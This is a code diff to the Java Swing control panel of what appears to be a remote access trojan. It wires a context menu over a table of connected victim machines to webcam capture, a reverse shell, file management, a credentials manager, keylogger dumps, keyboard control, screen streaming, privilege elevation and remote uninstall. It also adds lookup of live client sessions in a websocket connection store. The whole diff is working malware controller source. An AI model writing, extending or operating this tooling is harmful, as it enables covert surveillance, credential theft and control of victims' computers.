@@ -1,6 +1,13 @@
 package TableUtils.Configuration;
 
 import Server.Client;
+import Server.ConnectionStore;
+import TableUtils.Credentials.CredentialsManagerGUI;
+import TableUtils.FileManager.FileManagerGUI;
+import TableUtils.KeyboardController.KeyboardControllerGUI;
+import TableUtils.ReverseShell.ReverseShellGUI;
+import TableUtils.ScreenStreaming.ScreenStreamerGUI;
+import TableUtils.WebcamManager.WebcamGUI;
 import Utilities.GetSYS;
 import Main.Main;
 import TableUtils.Connection.Actions.ConnectionAction;
@@ -19,12 +26,16 @@ import TableUtils.Permissions.Actions.PermissionsAction;
 import TableUtils.ReverseShell.Listeners.ReverseShellMenuListener;
 import TableUtils.SystemState.Constants.SystemStatus;
 import TableUtils.SystemState.Actions.SystemStateAction;
+import org.eclipse.jetty.websocket.api.Session;
 
 import javax.swing.*;
 import javax.swing.table.DefaultTableModel;
 import java.awt.event.MouseAdapter;
 import java.awt.event.MouseEvent;
+import java.util.Iterator;
+import java.util.Map;
 import java.util.Objects;
+import java.util.concurrent.ConcurrentHashMap;
 
 public class TablePopUpListener extends MouseAdapter {
 
@@ -42,20 +53,26 @@ public class TablePopUpListener extends MouseAdapter {
         JMenuItem removeRowItem = new JMenuItem("Remove row");
         JMenuItem updateItem = new JMenuItem("Refresh client");
         disconnectedPopUpMenu.add(removeRowItem);
-       // removeRowItem.addActionListener(e -> getConnectionsDefaultTableModel().removeRow(maingetConnectionsTable().getSelectedRow()));
+        removeRowItem.addActionListener(e -> mainGUI.getConnectionsDefaultTableModel().removeRow(mainGUI.getConnectionsTable().getSelectedRow()));
         disconnectedPopUpMenu.add(updateItem);
-        updateItem.addActionListener(e -> refreshClient()
-        );
+        updateItem.addActionListener(e -> refreshClient());
     }
 
     private void refreshClient() {
         javax.swing.table.TableModel tableModel = Main.gui.getConnectionsTable().getModel();
         int row = Main.gui.getConnectionsTable().getSelectedRow();
-       // String UUID = (String) maingetConnectionsDefaultTableModel().getValueAt(row, 0);
-       /* for (Map.Entry<String, ClientHandler> entry : Main.Main.server.getMap().entrySet())
-            if ((UUID).equals(entry.getKey())) {
-                maingetConnectionsDefaultTableModel().setValueAt("Connected", row, tableModel.getColumnCount() - 1);
-            }*/
+        String UUID = (String) tableModel.getValueAt(row, 0);
+        ConcurrentHashMap<Session, Client> map = ConnectionStore.connectionsMap;
+        Iterator<Map.Entry<Session, Client>> iterator = map.entrySet().iterator();
+        boolean found = false;
+        while (iterator.hasNext() && !found) {
+            Map.Entry<Session, Client> entry = iterator.next();
+            if ((UUID).equals(entry.getValue().getUUID())) {
+                tableModel.setValueAt("Connected", row, tableModel.getColumnCount() - 1);
+                found = true;
+            }
+        }
+
     }
 
     public static void setIconToMenuItem(JMenuItem item, String path) {
@@ -129,16 +146,16 @@ public class TablePopUpListener extends MouseAdapter {
 
        // JTable connectionsTable = maingetConnectionsTable();
         // set actions
-        webcamMenu.addActionListener(new WebcamMenuListener(mainGUI));
-        fileManagerMenu.addActionListener(new FileManagerMenuListener(mainGUI));
-        reverseShellMenu.addActionListener(new ReverseShellMenuListener(mainGUI));
-        credentialsManagerMenu.addActionListener(new CredentialsMenuListener());
+        webcamMenu.addActionListener(new WebcamMenuListener(WebcamGUI::new));
+        fileManagerMenu.addActionListener(new FileManagerMenuListener(FileManagerGUI::new));
+        reverseShellMenu.addActionListener(new ReverseShellMenuListener(ReverseShellGUI::new));
+        credentialsManagerMenu.addActionListener(new CredentialsMenuListener(CredentialsManagerGUI::new));
         dumpLogsMenu.addActionListener(new KeyLoggerAction(KeyLog.DUMP_LAST));
         dumpAllLogsMenu.addActionListener(new KeyLoggerAction(KeyLog.DUMP_ALL));
-        keyboardController.addActionListener(new KeyboardControllerMenuListener(mainGUI));
+        keyboardController.addActionListener(new KeyboardControllerMenuListener(KeyboardControllerGUI::new));
         elevatePrivilegesMenu.addActionListener(new PermissionsAction());
         messageBoxMenu.addActionListener(new MessageBoxMenuListener());
-        streamScreenMenu.addActionListener(new ScreenMenuListener());
+        streamScreenMenu.addActionListener(new ScreenMenuListener(ScreenStreamerGUI::new));
         restartMenu.addActionListener(new ConnectionAction(ConnStatus.RESTART));
         disconnectMenu.addActionListener(new ConnectionAction(ConnStatus.DISCONNECT));
         uninstallMenu.addActionListener(new ConnectionAction(ConnStatus.UNINSTALL));
@@ -158,11 +175,11 @@ public class TablePopUpListener extends MouseAdapter {
             DefaultTableModel defaultTableModel = Main.gui.getConnectionsDefaultTableModel();
             if (defaultTableModel.getValueAt(row, defaultTableModel.getColumnCount() - 1).equals("Connected")) {
                 connectedPopUpMenu.show(e.getComponent(), e.getX(), e.getY());
-                Client client = GetSYS.getClientHandler();
+               /* Client client = GetSYS.getClientHandler();
                 assert client != null;
                 webcamMenu.setVisible(client.getSysInfo().WEBCAM());
                 keyloggerMenuOptions.setVisible(client.getSysInfo().KEYLOGGER());
-                streamScreenMenu.setVisible(client.getSysInfo().WEBCAM());
+                streamScreenMenu.setVisible(client.getSysInfo().WEBCAM());*/
             } else disconnectedPopUpMenu.show(e.getComponent(), e.getX(), e.getY());
         }
     }
